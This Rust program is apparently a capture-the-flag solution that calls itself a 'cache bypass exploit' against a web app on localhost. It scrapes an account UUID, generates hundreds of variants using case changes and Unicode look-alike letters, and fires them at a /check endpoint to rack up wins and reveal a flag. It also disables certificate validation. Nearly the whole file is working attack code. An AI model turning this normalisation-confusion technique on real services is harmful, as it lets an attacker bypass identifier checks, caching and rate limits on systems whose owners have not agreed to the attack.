use reqwest::{Client, ClientBuilder};
use regex::Regex;
use std::collections::{HashMap, HashSet};
use std::time::{SystemTime, UNIX_EPOCH};
use anyhow::Result;

const BASE_URL: &str = "http://localhost:5000";

async fn get_valid_uuid(client: &Client) -> Result<Option<String>> {
    let response = client.get(format!("{}/", BASE_URL)).send().await?;
    let text = response.text().await?;
    let re = Regex::new(r"Your unique account ID: ([^<]+)")?;
    Ok(re.captures(&text).map(|cap| cap[1].to_string()))
}

fn get_special_char(c: char) -> char {
    const CHARS: [(char, &[char]); 6] = [
        ('a', &['ą', 'ă', 'ā', 'ạ', 'ả']),
        ('b', &['ḃ', 'ḅ', 'ƀ', 'ɓ']),
        ('c', &['ć', 'č', 'ċ', 'ç']),
        ('d', &['ď', 'ḋ', 'đ', 'ɗ']),
        ('e', &['ę', 'ě', 'ė', 'ẹ']),
        ('f', &['ḟ', 'ƒ'])
    ];
    
    if let Some((_, variants)) = CHARS.iter().find(|(base, _)| *base == c.to_ascii_lowercase()) {
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs_f64();
        let hash_value = format!("{}{}", timestamp, c).bytes().fold(0u64, |acc, b| acc.wrapping_add(b as u64));
        variants[hash_value as usize % variants.len()]
    } else {
        c
    }
}

fn generate_uuid_variations(base_uuid: &str) -> Vec<String> {
    let mut variations = Vec::new();
    let mut seen = std::collections::HashSet::new();
    
    // Remove hyphens and convert to lowercase
    let clean_uuid = base_uuid.replace('-', "").to_lowercase();
    
    // Split into sections (8-4-4-4-12)
    let sections = vec![
        &clean_uuid[0..8],
        &clean_uuid[8..12],
        &clean_uuid[12..16],
        &clean_uuid[16..20],
        &clean_uuid[20..]
    ];
    
    // Generate variations for each section
    let mut section_variations = Vec::new();
    for section in sections {
        let mut section_vars = std::collections::HashSet::new();
        
        // Generate multiple patterns per section
        for i in 0..50 {
            for special_char_count in 1..=section.len() {
                let mut new_section = String::new();
                let timestamp = SystemTime::now()
                    .duration_since(UNIX_EPOCH)
                    .unwrap()
                    .as_secs_f64();
                
                // Generate special positions
                let mut special_positions = std::collections::HashSet::new();
                let hash_input = format!("{}{}{}", timestamp, i, special_char_count);
                let hash_value = hash_input.bytes().fold(0u64, |acc, b| acc.wrapping_add(b as u64));
                for _ in 0..special_char_count {
                    special_positions.insert(hash_value as usize % section.len());
                }
                
                // Build new section with special chars
                for (j, c) in section.chars().enumerate() {
                    if c.is_alphabetic() {
                        if special_positions.contains(&j) {
                            new_section.push(get_special_char(c));
                        } else {
                            new_section.push(if (i * j) % 2 == 0 { c.to_ascii_uppercase() } else { c });
                        }
                    } else {
                        new_section.push(c);
                    }
                }
                section_vars.insert(new_section);
            }
        }
        section_variations.push(section_vars.into_iter().collect::<Vec<_>>());
    }
    
    // Generate final variations by combining different section variations
    let max_variations = 500;
    for i in 0..1000 {
        if variations.len() >= max_variations {
            break;
        }
        
        // Pick variations for each section
        let mut new_uuid = String::new();
        for (idx, section_vars) in section_variations.iter().enumerate() {
            if !section_vars.is_empty() {
                let section = &section_vars[i % section_vars.len()];
                new_uuid.push_str(section);
                if idx < 4 {  // Add hyphens except after last section
                    new_uuid.push('-');
                }
            }
        }
        
        if !seen.contains(&new_uuid) {
            seen.insert(new_uuid.clone());
            variations.push(new_uuid);
        }
    }
    
    variations
}

#[tokio::main]
async fn main() -> Result<()> {
    println!("Cache bypass exploit starting...");
    
    let client = ClientBuilder::new()
        .danger_accept_invalid_certs(true)
        .build()?;

    if let Some(uuid) = get_valid_uuid(&client).await? {
        let variations = generate_uuid_variations(&uuid);
        let mut success_count = 0;
        
        for (i, variant) in variations.iter().enumerate() {
            let resp = client.get(format!("{}/check?uuid={}", BASE_URL, variant))
                .send()
                .await?;
            let text = resp.text().await?;
            
            if !text.contains("Invalid") {
                println!("Trying {}: {}", variant, text);
            }
            
            if text.contains("FLAG") {
                println!("\nSUCCESS! Found the flag!");
                println!("{}", text);
                return Ok(());
            }
            
            if text.contains("more wins to go") {
                success_count += 1;
                println!("Success! Total wins: {}/500", success_count);
            }
            
            if success_count >= 500 {
                println!("\nSUCCESS! We've won 500 times!");
                return Ok(());
            }
            
            // Small delay to prevent overwhelming the server
            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
        }
    }

    Ok(())
}
